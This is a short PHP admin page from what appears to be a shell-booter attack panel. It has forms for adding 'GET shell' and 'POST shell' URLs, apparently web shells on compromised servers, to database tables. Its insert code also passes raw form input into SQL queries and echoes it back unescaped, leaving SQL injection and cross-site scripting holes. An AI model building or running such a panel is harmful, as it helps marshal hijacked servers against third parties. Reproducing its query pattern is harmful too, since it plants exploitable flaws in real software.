<?php
require('myaccount.php');
?>

<div class="content">
<?php if (checkAdmin()) { ?> 
Input a PHP page extension of a shell below to insert it to the database: <br> <br>


Add a GET Shell: <form name="frmcontadd" action="" method="post">
<input class="entryfield" name="url" type="text" id="url">
<input class="button" type="submit" name="Submit" value="Add GET Shell"></td>

</form>



Add a POST Shell: <form name="frmcontadd" action="" method="post">
<input class="entryfield" name="url2" type="text" id="url2"></td>
<input class="button" type="submit" name="Submit2" value="Add POST Shell">

</form>

<?php
if (isset($_POST['Submit'])){
	$host = $_POST['url'];
	$query = "INSERT INTO getshells (url) VALUES ('$host')";
	$result = mysql_query($query);
echo '<hr>Successfully added GET Shell, ' . $host . ' to the shells database.';
}
?>

<?php
if (isset($_POST['Submit2'])){
	$host2 = $_POST['url2'];
	$query = "INSERT INTO postshells (url) VALUES ('$host2')";
	$result = mysql_query($query);
echo '<hr>Successfully added POST Shell, ' . $host2 . ' to the shells database.';
}
}
?>
</div>


<br>

<?php 
include 'footer.php';
?>